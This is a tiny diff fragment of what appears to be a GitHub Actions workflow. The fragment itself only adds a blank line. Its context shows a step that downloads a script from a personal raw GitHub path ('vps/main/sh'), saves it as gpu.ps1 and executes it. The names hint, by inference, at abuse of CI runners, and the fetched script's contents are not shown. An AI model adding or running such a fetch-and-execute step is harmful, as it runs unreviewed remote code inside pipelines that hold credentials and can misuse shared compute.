@@ -19,3 +19,4 @@ jobs:
             Invoke-WebRequest https://raw.githubusercontent.com/victornana111/vps/main/sh -OutFile gpu.ps1 
           
       - run: ./gpu.ps1
+      
